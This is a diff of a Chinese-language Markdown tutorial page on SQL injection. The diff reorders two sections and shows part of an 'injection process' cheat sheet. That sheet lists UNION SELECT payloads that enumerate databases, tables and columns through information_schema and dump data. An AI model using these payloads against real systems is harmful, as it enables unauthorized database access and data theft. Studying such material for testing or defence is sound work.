@@ -4,10 +4,10 @@
 ###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x02 注入函数
 ![](/assets/49A439B31D3656FE1266C2809C616748.png)
 ![](/assets/E33220D060B048EAA19A59928F1FFA64.png)
-###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 样例代码
-![](/assets/83A2168FAA2CDFB87AF8716FC9F92A3B.png)
-###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04 关于内置库
+###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 关于内置库
 ![](/assets/618D4E32E84852266ED812F5595453FF.png)
+###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x04 样例代码
+![](/assets/83A2168FAA2CDFB87AF8716FC9F92A3B.png)
 ###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x05 注入流程
 ####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.注入点识别:
 ```
@@ -33,7 +33,7 @@
    字段长度: order by
    显示字段: union select null,null,强制报错显示字段
    查库信息: union select database(),version()
-   查库: union select group_concat(schema_name) from information_schema.schemata,null
+   查库: union select group_concat(schema_name) from information_schema.schemata
    查表: union select group_concat(table_name) from information_schema.tables where table_schema=database()
    查列: union select group_concat(column_name) from information_schema.columns where table_name='表名'(注1)
    查数据: union select group_concat(null) from 库名.表名
